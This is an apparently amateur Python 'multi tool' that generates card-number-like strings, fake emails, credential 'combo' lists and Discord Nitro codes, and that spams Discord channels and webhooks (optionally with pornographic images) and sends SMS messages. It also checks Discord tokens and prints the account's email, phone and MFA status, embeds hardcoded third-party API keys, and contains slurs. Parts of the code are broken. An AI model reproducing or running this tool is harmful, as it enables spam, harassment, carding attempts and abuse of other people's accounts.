import random
import json
import time
import base64
import string
import os
import pythonping
import colorama
import discord
import requests
from os import system
from colorama import init, Fore, Style
from random import randint
from random import choice
from random import randrange
from pythonping import ping
from discord.ext import commands





system(f'title FreeMoneyHubs Multi Tool V 1.1.2')
print(f'''
{Fore.RED}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▐                                         FreeMoneyHubs Multi Tool                                           ▐
▐                                         ------------------------                                           ▐
▐                                                                                                            ▐
▐   1 = Card Gen   2 = Email Gen   5 = Phone Gen   7 = Nitro Gen   12 = Combo Gen   17 = Proxy Gen           ▐
▐                                                                                                            ▐
▐   3 = Ip Pinger   4 = Ip Analyzer   13 = Domain Check  14 = Email Check  18 = Discord Token Checker        ▐
▐                                                                                                            ▐
▐   6 = Discord Spammer   10 = Webhook Spammer  16 = Sms Sender                                              ▐
▐                                                                                                            ▐
▐   8 = Base64 Encoder   9 = Base64 Decoder                                                                  ▐
▐                                                                                                            ▐
▐   11 = Morpheus  15 = FakeHack                                                                             ▐
▐                                                                                                            ▐
▐                                                                                                            ▐
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀{Style.RESET_ALL}
''')


menu3 = input(f"{Fore.LIGHTBLUE_EX}[?] : {Style.RESET_ALL}")
if menu3 == '1':
    num = input(f'{Fore.LIGHTBLUE_EX}[?] How Many Cards To Generate : {Style.RESET_ALL}')
    loopamm = int(num)
    frist = (['Travel: 3', 'Visa: 4', 'MasterCard: 5', 'Discover: 6'])
    second = (['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'])
    third = (['23', '24', '25', '26', '27'])
    with open(f"Cards{num}.txt", "w", encoding='utf-8') as filebb:

        for i in range(loopamm):
            gaminqds = randrange(100, 999)
            weareweare = randrange(1000, 9999)
            jejdjehdhhrh = randrange(1000, 9999)
            udjdhddhdhh = randrange(1000, 9999)
            hdidhdushsnd = randrange(100, 999)
            part1 = (random.choice(frist))
            part2 = (gaminqds)
            part3 = (weareweare)
            part4 = (jejdjehdhhrh)
            part5 = (udjdhddhdhh)
            part6 = (hdidhdushsnd)
            part7 = (random.choice(second))
            part8 = (random.choice(third))
            print(f'{Fore.GREEN}{Style.BRIGHT}({i}) - {part1}{part2}-{part3}-{part4}-{part5} {part7}/{part8} {part6}{Style.RESET_ALL}')
            filebb.write(f"{part1}{part2}{part3}{part4}{part5} {part7}/{part8} {part6}\n")
        with open(f"Cards{num}.txt") as filebb:
            for line in file.readlines():
                carddie = line.strip("\n")
                print(f"{Fore.GREEN}{Style.BRIGHT}[!] Finished{Style.RESET_ALL}")

elif menu3 == '2':
    baiduj = input(f'{Fore.LIGHTBLUE_EX}[?] How Mail Emails To Make : ')
    with open(f"Emails{baiduj}.txt", "w", encoding='utf-8') as fileffs:
        jdjdjd = (['justin', 'james', 'juan', 'lopez', 'matt', 'bryan', 'tina', 'mark', 'mason', 'brass', 'jeff', 'caleb',
         'marten', 'willson', 'pro', 'old', 'oscar', 'asher', 'gaming', 'davis', 'noah', 'seth', 'trent', 'luke',
         'carson', 'ella', 'brook', 'tate', 'brice', 'collin', 'ryan','jamie','mega','ted','steve','joe','copper','coder'])
        bbsi = (['@gmail.com', '@yahoo.com', '@hotmail.com'])
        inny23 = int(baiduj)
        time.sleep(.5)
        for i in range(inny23):
            partt0 = randrange(1, 999)
            partt1 = (random.choice(jdjdjd))
            partt2 = (random.choice(bbsi))
            print(f'{Fore.GREEN}{Style.BRIGHT}({i}) - {partt1}{partt0}{partt2}{Style.RESET_ALL}')
            fileffs.write(f"{partt1}{partt0}{partt2} \n")
        with open(f"mails{baiduj}.txt") as filebb:
            for line in file.readlines():
                emaildie = line.strip("\n")
                print(f"{Fore.GREEN}{Style.BRIGHT}[!] Finished{Style.RESET_ALL}")
elif menu3 == '3':
    ippp = input(f"{Fore.LIGHTBLUE_EX}[?] Enter Ip To Ping : ")
    ammo3unt = input(f"{Fore.LIGHTBLUE_EX}[?] Amount Of Times To Ping : ")
    nummies = int(ammo3unt)
    try:
        ping(f'{ippp}', count=nummies, verbose=True)
        time.sleep(1)
        print("[!] Finished")
    except:
        print(f"{Fore.RED}{Style.BRIGHT}[!] That Ip Is Not Possible To Even Have Retard{Style.RESET_ALL}")
elif menu3 == '4':
    aufsaifs = input(f"{Fore.LIGHTBLUE_EX}[?] Enter The Ip You Want To Get Info On : ")
    daaataaa = requests.get(f"http://ip-api.com/json/{aufsaifs}")
    if daaataaa.status_code == 200:
            boobaas = curl = daaataaa.json()
            print(boobaas)
elif menu3 == '5':
    phonee = input(f"{Fore.LIGHTBLUE_EX}[?] How Many Numbers To Generate : ")
    print(f"[!]{Fore.RED}  WE ONLY HAVE 250 REQ PER MONTH PER API KEY SO DONT AFK THIS STUFF BRO")
    time.sleep(1)
    phonee2 = int(phonee)
    with open(f"PhoneNums{phonee2}.txt", "w", encoding='utf-8') as ggas:
        for i in range(phonee2):
            kyyee = random.choice(['8a9b286db37242278c650f057e69af0a','c18e40093aa54050869e6c025cd212ad','ce7e22fa1b664e30b7479c2fae835b6e','65fb967dd10d4dfdae57aac38359b784','4ef2dc40a978468fa34d3148fa5edea2','57e32fc3db4a43f8bb1a8789530e47e2','7dca8166ab2c4dac8fe6f92b4cbd6d07','fcdad5e099284c5b8e87a92a1ea799b8','a73831d44e694faaac2f2700cf477200','7da18e005724444fbc5c663b5f936bae','39d2d11cc1dc4e43a0f6d2851365fc74','1040025afab84d3fb0a54b03dc05e973','e366c837dfff41b6a929ea9c5dc39f39','e1cbb145d55c47beb794d53e0ecfd0e5','9349b70a50f94a08b33622c794f0133b','2baaaa8e8eab4a08aeea4fad3c5022eb','7c1e7070816f40a68f43c96a098e6247','82e2b664b70844beb297ade47f46bdf0'])
            areacodde = randrange(200, 999)
            telprefix = randrange(200, 999)
            linenumm = randrange(1000, 9999)
            sexa2 = print(f"{Fore.LIGHTGREEN_EX}({i}) Genned : 1-{areacodde}-{telprefix}-{linenumm}")
            sexa4 = (f" 1-{areacodde}-{telprefix}-{linenumm}")
            sexa3main = f"1{areacodde}{telprefix}{linenumm}"
            response = requests.get(f"https://phonevalidation.abstractapi.com/v1/?api_key={kyyee}&phone={sexa3main}")
            if response.status_code == 200:
                jsonshit = json.loads(response.content)
                if jsonshit['valid']:
                    ggas.write(f"{sexa4}   -   {response.content} \n")
                    print(f'{Fore.GREEN}valid Phone Number Logged')
                else: 
                    print(f'{Fore.RED} Invalid Phone Number')
                print(f"{Fore.GREEN}Response For {sexa3main} - {response.content}")

            else:
                print(f"{Fore.RED}{Style.BRIGHT}[!] 404 THIS API KEY DED WAIT 1 MONTH{Style.RESET_ALL}")
elif menu3 == '6':
    tooooken = input(f"{Fore.LIGHTBLUE_EX}[?] Enter Discord Token : ")
    print(f'Using {tooooken}')
    bot = commands.Bot(command_prefix='!')

    aaa3894 = input(f"{Fore.LIGHTBLUE_EX}[?]How Many Times Do Want To Spam : ")
    ghajfuj = input(f"{Fore.LIGHTBLUE_EX}[?] What Message Do You Want To Spam : ")
    G4dah4 = int(aaa3894)
    time.sleep(1)
    print(f"{Fore.LIGHTBLUE_EX}[!] Type - !spam Where You Want To Spam")
    time.sleep(1)
    @bot.event
    async def on_message(message):
        if message.content.startswith('!spam'):
            for i in range(G4dah4):
                await message.channel.send(f"({i}) {ghajfuj}")

    bot.run(f"{tooooken}", bot=False)
elif menu3 == '7':
    print(f"{Fore.RED}Due To The Shitty Chances Of Getting A Real Code We Dont Have A Checker Sorry")
    time.sleep(1)
    AMMOun4t = input(f"{Fore.LIGHTBLUE_EX}[?] How Many Codes Do You Want To Make : ")
    G4dah4ss = int(AMMOun4t)
    with open(f"NitroCodes{AMMOun4t}.txt", "w", encoding='utf-8') as fileffs:
        codeLen = 16
        letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        for i in range(G4dah4ss):
            cood43 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(16))
            print(f"{Fore.GREEN}({i})discord.gift/{cood43}")
            fileffs.write(f"discord.gift/{cood43} \n")
elif menu3 == '8':
    messag3dea = input(f"{Fore.LIGHTBLUE_EX}[?] Type The Message You Want To Encode : ")
    sample_string = f"{messag3dea}"
    sample_string_bytes = sample_string.encode("ascii")
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    print(f"{Fore.GREEN}Encrypted Message : {base64_string}")
elif menu3 == '9':
    messag3desa = input(f"{Fore.LIGHTBLUE_EX}[?] Type The Message You Want To Decode : ")
    base64_string = f"{messag3desa}"
    base64_bytes = base64_string.encode("ascii")
    sample_string_bytes = base64.b64decode(base64_bytes)
    sample_string = sample_string_bytes.decode("ascii")
    print(f"{Fore.GREEN}Decrypted Message : {sample_string}")
elif menu3 == '10':
    webhookurl = input(f'[?] Enter The Webhook Url : ')
    messah48 = input(f"[?] Enter The Message To Spam : ")
    sdashdd = input(f"[?] Name Of The Webhook : ")
    sadhjsdjasd = input(f"[?] How Many Times To Spam Webhook : ")
    ballsxd = int(sadhjsdjasd)
    jamiee = input('[?] Add Hentai y/n : ')
    ballsxdxxd3 = (['https://nekos.life/api/v2/img/boobs','https://nekos.life/api/v2/img/pussy'])
    if jamiee == "y":
        for i in range(ballsxd):
            chumly = random.choice(ballsxdxxd3)
            res = requests.get(f"{chumly}")
            if res.status_code == 200:
                boobs = curl = res.json()["url"]
                sexxdded = f"{messah48} - {boobs}"
                dataaa = requests.post(webhookurl, json={"content": str(sexxdded), "name": str(sdashdd), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
                print(f"{i} {Fore.GREEN} Message Sent")
    elif jamiee == "n":
        for i in range(ballsxd):
            dataaa = requests.post(webhookurl, json={"content": str(messah48), "name": str(sdashdd), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
            print(f"{i} {Fore.GREEN} Message Sent")
elif menu3 == '11':
    niggaaa = "999999999999999999999999"
    jameeisxz = int(niggaaa)
    for i in range(jameeisxz):
        fakehackermsg = random.choice(['Decrypting Firewall','Anlyzing ByteCode','Exploting Weakness','Attempting to brute force admin password','<HTTP HEADERS>','PACKAGE=JSON.FILE'])
        cood43 = "".join(random.choice("1 2 3 4 5 6 7 8 9 0 ") for _ in range(4000))
        time.sleep(.005)
        print(f'{fakehackermsg} {Fore.GREEN}{cood43}')
elif menu3 == '12':
    whooo = "@yahoo.com"
    jamz840 = input(f"{Fore.LIGHTCYAN_EX}[?] How Many Combos Do You Want To Make : ")
    nummiesss = int(jamz840)
    maof = (['cooper','feet','gaminqs','ricebb','mattie','homies','fortnite','email','main','bikes','Douglas','Zachary','Peter','Kyle','george','shroud','reactor','Walter','Ethan','Jeremy','Harold','Keith','Beast','Baloon','rich','roddy','apple','bear','hecktor','pines','schools','mapping','awesome','bird','purple','magical','gaming','trappa','monster','creative','youtube','OMFG','spire','chip','Jailed','tick','mathew','Micc','house','Fighter','jet','santos','crypto','kitten','rapper','Swan'])
    with open(f"Combos{jamz840}.txt", "w", encoding='utf-8') as fileffs:
        for i in range(nummiesss):
            hguoo = random.choice(maof)
            gamer3 = (random.randint(0, 5))
            gamer21 = (random.randint(8, 16))
            gamer2 = (random.randint(0, 2))
            cood43 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(gamer3))
            cood433 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(gamer2))
            cood4333 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(gamer21))
            print(f"{Fore.GREEN}{cood433}{hguoo}{cood43}{whooo}:{cood4333}")
            fileffs.write(f"{cood433}{hguoo}{cood43}{whooo}:{cood4333}\n")
elif menu3 == '13':
    domain = input(f"{Fore.LIGHTCYAN_EX}[?] What Domain Are You Trying To Check No HTTPS : ")
    keys = random.choice(['nlAYxCOOPBWDueI8Wu2IH5YpXQPrsCS4','jy7R1EcNX9fz6yyip21PGobkcH1Gkamp'])
    try:
        url = f"https://api.promptapi.com/whois/check?domain={domain}"
        payload = {}
        headers = {
            "apikey": f"{keys}"
        }
        response = requests.request("GET", url, headers=headers, data=payload)
        status_code = response.status_code
        result = response.text
        print(f"{response} : {result} ")
    except:
        print(f"{Fore.RED}The Api Key Is Down Wait For A New Update Or Contact Me On Github")
elif menu3 == '14':
    key = random.choice(['FTFGFJi5QBMmcCn2yogGDXwye72NVVZY','KVPwoPgSR3HO8hrjnoHGv28AYAEFp7fI','QB3zT99JD1On6XBpPKU3EBntnNhT1kZ8'])
    email = input(f'{Fore.LIGHTCYAN_EX}[?] Enter The Email You Want To Check : ')
    print("Sending Request Please Wait")
    url = f"https://api.promptapi.com/email_verification/{email}"
    payload = {}
    headers = {
        "apikey": f"{key}"
     }
    response = requests.request("GET", url, headers=headers, data=payload)
    status_code = response.status_code
    result = response.text
    print(f'{status_code} : {result}')
elif menu3 == '15':
    email = input(f'{Fore.LIGHTCYAN_EX}[?] Enter The Thingy You Want To Fake Hack : ')
    balls = int("58588585858858558585858")
    for i in range(balls):
        gamer2212 = random.randint(5, 5000000000000000000)
        responcealt = random.choice(['Packet Error','Host Not Responding',f'Frame Error ID : {gamer2212}','CloudFlare Error 400'])
        responce = random.choice(['Invalid Login',f'Internal Error == {responcealt}'])
        gamer221 = random.randint(5, 50)
        cood4333 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(gamer221))
        time.sleep(.05)
        print(f'{Fore.GREEN} ({i}) Hacking {Fore.LIGHTGREEN_EX}{email} : {Fore.YELLOW}{cood4333}  {Fore.RED}{responce}')
elif menu3 =='16':
    james = input('[?] Enter The Phone Number Example - 12143275829 : ')
    message = input('[?] Enter The Message You Want To Send : ')
    resp = requests.post('https://textbelt.com/text', {
        'phone': f'{james}',
        'message': f'{message}',
        'key': 'textbelt',
    })
    print(resp.json())
elif menu3 =='17':
    question1 = input('[?] Do You Want Fake Proxys y/n : ')
    if question1 =='n':
        huo = "55555555555555555555"
        jamesad = int(huo)
        print('Getting Proxys From Diffrent Apis')
        egg = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all')
        print(egg.text)
        egg2 = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=3000&country=all&ssl=all&anonymity=all')
        print(egg2.text)
        for i in range(jamesad):
            keys = random.choice(['https://public.freeproxyapi.com/api/Proxy/Mini','http://pubproxy.com/api/proxy','https://gimmeproxy.com/api/getProxy',])
            spaz = requests.get(f"{keys}")
            print(spaz.json())
    elif question1 =='y':
        howmany = input('[?] How Many Proxys Do You Want To Generate : ')
        thenum = int(howmany)
        for i in range(thenum):
            ports = random.choice(['80','443','8000','8080'])
            sex = (random.randint(10, 250))
            sex1 = (random.randint(1, 250))
            sex2 = (random.randint(1, 250))
            sex3 = (random.randint(1, 250))
            print(f"{sex}.{sex1}.{sex2}.{sex3}:{ports}")
elif menu3 =='18':
    token = input('[?] Enter The Discord Token : ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        print(' - Token is valid - ')
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        verified = r.json()['verified']
        bio = r.json()['bio']
        print(f'''
    User: {userName}
    ID: {userID}
    Phone: {phone}
    Email: {email}
    MFA: {mfa}
    Verified: {verified}
    Token: {token}
    Bio: {bio}
                ''')
    else:
        print('Invalid token')
